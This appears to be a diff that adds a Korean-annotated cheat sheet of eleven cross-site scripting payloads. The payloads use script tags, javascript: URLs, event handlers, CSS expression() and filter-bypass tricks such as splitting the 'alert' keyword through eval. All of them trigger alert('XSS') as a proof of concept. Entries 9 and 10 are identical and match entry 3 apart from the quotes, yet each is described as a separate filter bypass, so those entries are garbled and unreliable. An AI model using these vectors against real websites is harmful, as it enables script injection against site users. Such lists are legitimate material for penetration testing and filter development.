@@ -1,0 +1,32 @@
+1. <SCRIPT> alert('XSS'); </SCRIPT>
+기본적인 XSS
+
+2. <IMG src="javascript:alert('XSS');" width=0 height=0>
+경로에 javascript: 프로토콜을 삽입한 XSS
+
+3. <IMG src="#" onerror="alert('XSS');" width=0 height=0>
+onerror 이벤트를 이용한 XSS
+
+4. <IMG src="http://www.loaded.com/loaded.gif" width=5000 heigth=5000 onmouseenter="alert('XSS');this.outerHTML='';">
+사용자가 마우스를 대도록 크기를 조정하고 onmouseenter 이벤트를 이용한 XSS
+
+5. <APPLET data="javascript:alert('XSS');">
+애플릿 경로에 javascript: 프로토콜을 삽입한 XSS
+
+6. <TABLE style="background-image: url('javascript:alert('XSS');');">
+테이블 배경 그림에 javascript: 프로토콜을 삽입한 XSS
+
+7. <IMG style="width: expression(alert('XSS'));">
+CSS의 expression 스크립트 확장 기능을 이용한 XSS
+
+8. <MARQUEE onstart="alert('XSS');this.outerHTML=''" loop=1>XSS</MARQUEE>
+마퀴 태그의 onstart 이벤트를 이용한 XSS
+
+9. <IMG src="#" onerror="alert("XSS");" width=0 height=0>
+XSS 방지 필터를 우회한 XSS #1
+
+10. <IMG src="#" onerror="alert("XSS");" width=0 height=0>
+XSS 방지 필터를 우회한 XSS #2
+
+11. <IMG src="#" onerror="eval('a' + 'lert')('XSS');" width=0 height=0>
+alert 키워드를 필터링하는 사이트의 경우 위와 같이 eval() 함수를 응용한 XSS가 가능하다
